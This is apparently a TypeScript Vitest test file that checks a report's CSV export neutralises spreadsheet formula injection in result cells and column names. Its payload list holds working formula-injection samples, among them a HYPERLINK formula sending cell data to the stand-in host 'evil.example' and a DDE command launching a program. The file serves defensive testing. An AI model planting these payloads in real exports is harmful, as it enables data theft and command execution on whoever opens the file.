import { describe, expect, it } from 'vitest';
import { resultToCsv } from '../server/csv.js';
import type { QueryResult } from '../shared/types.js';

/**
 * Spreadsheet formula injection (CWE-1236) in the CSV export.
 *
 * RFC-4180 quoting is not a defence: the quotes are consumed by the CSV
 * parser, and the cell underneath is then interpreted by Excel, LibreOffice
 * Calc or Google Sheets. A cell starting with `=`, `+`, `-`, `@`, a tab or a
 * CR runs as a formula in all three — so for an export of records that users
 * typed in themselves, the operator who opens the file executes whatever the
 * last person to edit a record wanted them to.
 *
 * Every assertion below therefore works on the PARSED cells rather than on the
 * raw text: what matters is the value a spreadsheet ends up with, and quoting
 * alone would make a raw-substring check pass while the payload still runs.
 */

/** The families that actually execute, one per leading character. */
const PAYLOADS = [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(A1)',
  '=HYPERLINK("https://evil.example/?d="&A1,"Click me")',
  "=cmd|'/c calc'!A1",
  '\t=1+1',
];

/** Parse RFC-4180 CSV back into rows of cells — what a spreadsheet sees. */
function parseCsv(text: string, delimiter = ','): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i]!;
    if (quoted) {
      if (ch !== '"') cell += ch;
      else if (text[i + 1] === '"') {
        cell += '"';
        i += 1;
      } else quoted = false;
      continue;
    }
    if (ch === '"') quoted = true;
    else if (ch === delimiter) {
      row.push(cell);
      cell = '';
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      i += 1;
    } else cell += ch;
  }
  if (cell !== '' || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

/** Every cell of the file, flattened. */
function cellsOf(csv: string, delimiter = ','): string[] {
  return parseCsv(csv, delimiter).flat();
}

/**
 * The payload survived as readable text, and no cell anywhere in the file
 * still begins with a character a spreadsheet would treat as a formula.
 */
function expectDefused(csv: string, payload: string, delimiter = ','): void {
  const cells = cellsOf(csv, delimiter);
  expect(cells).toContain(`'${payload}`);
  expect(cells).not.toContain(payload);
  for (const cell of cells) expect(cell).not.toMatch(/^[=+@\t\r]/);
}

/**
 * As `expectDefused`, but for a payload that reached the file THROUGH the API:
 * text fields are trimmed on the way in, so the stored — and exported — value
 * is the trimmed one. The invariant that matters is unchanged.
 */
function expectDefusedInput(csv: string, payload: string, delimiter = ','): void {
  expectDefused(csv, payload.trim(), delimiter);
}

function result(rows: Record<string, unknown>[], columns = ['label', 'amount']): QueryResult {
  return { columns, rows, truncated: false, elapsed_ms: 1 };
}

describe('report CSV export neutralizes spreadsheet formulas', () => {
  // A report runs arbitrary SELECTs over the operational tables, so any text
  // any user of any module ever typed can land in a result cell.
  it.each(PAYLOADS)('defuses %o in a result cell', (payload) => {
    expectDefused(resultToCsv(result([{ label: payload, amount: 42 }])), payload);
  });

  it.each(PAYLOADS)('defuses %o in a column NAME as well', (payload) => {
    // Column names come from the report's own SQL (aliases included), which is
    // operator-authored but still ends up in row 1 of the file.
    expectDefused(resultToCsv(result([{ [payload]: 1 }], [payload])), payload);
  });

  it('defuses with a non-comma delimiter too', () => {
    expectDefused(resultToCsv(result([{ label: '=1+1', amount: 42 }]), ';'), '=1+1', ';');
  });

  it('leaves numbers, bigints and negatives as values', () => {
    const cells = cellsOf(resultToCsv(result([{ label: 'Net, total', amount: -1234n }])));
    expect(cells).toContain('Net, total');
    expect(cells).toContain('-1234');
    expect(cells).not.toContain("'-1234");
  });

  it('renders an empty result as just the header row', () => {
    expect(resultToCsv(result([]))).toBe('label,amount\r\n');
  });
});
